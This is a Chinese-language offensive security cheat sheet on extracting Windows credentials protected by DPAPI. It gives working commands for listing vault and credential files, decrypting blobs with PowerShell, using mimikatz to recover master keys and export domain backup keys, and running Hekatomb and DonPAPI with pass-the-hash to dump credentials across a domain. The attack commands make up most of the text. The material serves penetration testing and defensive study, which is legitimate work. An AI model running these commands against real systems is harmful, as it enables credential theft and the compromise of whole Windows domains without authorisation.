# Windows - DPAPI

> 在 Windows 上，保存在 Windows 凭据管理器 (Windows Credentials Manager) 中的凭据使用 Microsoft 的数据保护 API (DPAPI) 进行加密，并作为 "blob" 文件存储在用户的 AppData 文件夹中。

## 目录 (Summary)

* [数据保护 API (Data Protection API)](#data-protection-api)
    * [列出凭据文件 (List Credential Files)](#list-credential-files)
    * [DPAPI LocalMachine 上下文](#dpapi-localmachine-context)
    * [Mimikatz - 凭据管理器与 DPAPI](#mimikatz---credential-manager--dpapi)
    * [Hekatomb - 窃取全域凭据](#hekatomb---steal-all-credentials-on-domain)
    * [DonPAPI - 远程转储 DPAPI 凭据](#donpapi---dumping-dpapi-credz-remotely)

## 数据保护 API (Data Protection API)

* 在域外：用户的`密码哈希 (password hash)`被用于加密这些 "blob"。
* 在域内：使用`域控制器的 master key (主密钥)`来加密这些 blob。

有了提取出的域控制器私钥，就可以解密所有的 blob，从而恢复该域内所有工作站的 Windows 身份管理器中记录的所有机密信息。

```ps1
vaultcmd /list

VaultCmd /listcreds:<namevault>|<guidvault> /all
vaultcmd /listcreds:"Windows Credentials" /all
```

### 列出凭据文件 (List Credential Files)

```ps1
dir /a:h C:\Users\用户名\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\用户名\AppData\Roaming\Microsoft\Credentials\

Get-ChildItem -Hidden C:\Users\用户名\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\用户名\AppData\Roaming\Microsoft\Credentials\
```

### DPAPI LocalMachine 上下文

`LocalMachine` 上下文用于保护旨在单台机器上供不同用户或服务共享的数据。这意味着在该机器上运行的任何用户或服务都可以使用适当的凭据访问受保护的数据。

相比之下，`CurrentUser` 上下文用于保护旨在仅由加密该数据的用户访问的数据，同一台机器上的其他用户或服务无法访问。

```ps1
$a = [System.Convert]::FromBase64String("AQAAANCMnd[...]")
$b = [System.Security.Cryptography.ProtectedData]::Unprotect($a, $null, [System.Security.Cryptography.DataProtectionScope]::LocalMachine)
[System.Text.Encoding]::ASCII.GetString($b)
```

### Mimikatz - 凭据管理器与 DPAPI

```powershell
# 检查文件夹以查找凭据
dir C:\Users\<用户名>\AppData\Local\Microsoft\Credentials\*

# 使用 mimikatz 检查文件
mimikatz dpapi::cred /in:C:\Users\<用户名>\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0
# 查找 master key
mimikatz !sekurlsa::dpapi
# 使用 master key
mimikatz dpapi::cred /in:C:\Users\<用户名>\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0 /masterkey:95664450d90eb2ce9a8b1933f823b90510b61374180ed5063043273940f50e728fe7871169c87a0bba5e0c470d91d21016311727bce2eff9c97445d444b6a17b

# 查找并导出备份密钥 (backup keys)
lsadump::backupkeys /system:dc01.lab.local /export
# 使用备份密钥
dpapi::masterkey /in:"C:\Users\<用户名>\AppData\Roaming\Microsoft\Protect\S-1-5-21-2552734371-813931464-1050690807-1106\3e90dd9e-f901-40a1-b691-84d7f647b8fe" /pvk:ntds_capi_0_d2685b31-402d-493b-8d12-5fe48ee26f5a.pvk
```

### Hekatomb - 窃取全域凭据

> [ProcessusT/Hekatomb](https://github.com/ProcessusT/HEKATOMB) 是一个 Python 脚本，它连接到 LDAP 目录以检索所有计算机和用户的信息。然后它将下载所有计算机上所有用户的 DPAPI blob。最后，它通过 RPC 提取域控制器私钥并使用它来解密所有凭据。

```python
pip3 install hekatomb
hekatomb -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp
```

![内存中的数据](https://github.com/ProcessusT/HEKATOMB/raw/main/.assets/github1.png)

### DonPAPI - 远程转储 DPAPI 凭据

* [login-securite/DonPAPI](https://github.com/login-securite/DonPAPI)

```ps1
DonPAPI.py domain/user:passw0rd@target
DonPAPI.py --hashes <LM>:<NT> domain/user@target

# 使用域备份密钥
dpapi.py backupkeys --export -t domain/user:passw0rd@target_dc_ip
python DonPAPI.py -pvk domain_backupkey.pvk domain/user:passw0rd@domain_network_list
```

## 参考资料 (References)

* [DPAPI - Extracting Passwords - HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords)
* [DON PAPI, OU L’ART D’ALLER PLUS LOIN QUE LE DOMAIN ADMIN - LoginSecurité - CORTO GUEGUEN - 4 MARS 2022](https://www.login-securite.com/2022/03/04/don-papi-ou-lart-daller-plus-loin-que-le-avec-dpapi/)
